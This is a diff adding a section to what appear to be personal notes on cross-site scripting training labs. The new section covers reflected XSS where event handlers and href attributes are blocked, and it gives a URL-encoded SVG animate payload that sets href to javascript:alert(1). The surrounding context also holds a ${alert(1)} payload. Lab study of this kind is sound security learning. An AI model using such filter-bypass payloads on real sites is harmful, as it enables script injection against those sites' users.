@@ -302,5 +302,13 @@ You Have a Search Funtion and search like asif and intercept the request and san
       ${alert(1)}
       
   
+ ## 11. Reflected XSS with event handlers and href attributes blocked
  
+ You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html
+  
+ To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.
+ 
+ ## Exploit 
+ 
+ example.com/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
  
